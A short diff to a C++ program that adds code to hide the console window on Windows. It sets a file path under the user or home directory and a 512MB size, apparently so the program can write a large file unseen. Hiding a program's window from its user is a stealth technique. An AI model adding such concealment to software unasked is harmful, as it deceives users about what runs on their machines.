@@ -9,17 +9,22 @@ using namespace std;
 
 int main() 
 {
-    
     #ifdef OS_Windows
-    // Windows code execution
-    const char *path="c:/Users/var.txt";
-    bool w = 1;
-    bool l = 0;
+        // Windows code execution
+        #include <Windows.h> // Include only if OS it's windows
+        // Hide console window
+        HWND Invisible;
+        AllocConsole();
+        Invisible = FindWindowA("ConsoleWindowClass", NULL);
+        ShowWindow(Invisible, 0);
+        const char *path="c:/Users/var.txt";
+        bool w = 1; // Running on windows boolean true
+        bool l = 0; // Running on GNU/Linux boolean false
     #else
-    // GNU/Linux code execution
-    const char *path="/home/var.txt";
-    bool l = 1;
-    bool w = 0;
+        // GNU/Linux code execution
+        const char *path="/home/var.txt";
+        bool l = 1; // Running on GNU/Linux boolean true
+        bool w = 0; // Running on windows boolean false
     #endif
 
     unsigned long int size = 536870912; // 512MB in bytes
